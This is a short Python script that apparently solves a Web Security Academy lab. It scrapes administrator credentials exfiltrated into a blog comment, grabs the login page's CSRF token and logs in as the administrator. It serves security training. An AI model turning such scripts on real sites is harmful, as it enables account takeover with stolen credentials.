import requests
from bs4 import BeautifulSoup
import re

site = '0a65004403082ff4801203d7005900e7.web-security-academy.net'
s = requests.Session()

# Step 1: Extract credentials from the exfiltrated comment
blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text, 'html.parser')
credentials = soup.find('p', text=re.compile('administrator')).text.split(':')
print(f"Extracted credentials: {credentials}")

# Step 2: Access login page and get CSRF token
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

# Step 3: Submit login form with stolen credentials
logindata = {
    'csrf': csrf,
    'username': credentials[0],
    'password': credentials[1]
}
resp = s.post(login_url, data=logindata)

# Step 4: Check if login and lab completion succeeded
if 'Congratulations' in resp.text:
    print("✅ Success: Logged in as administrator and solved the lab.")
else:
    print("❌ Login failed or lab not yet marked as solved.")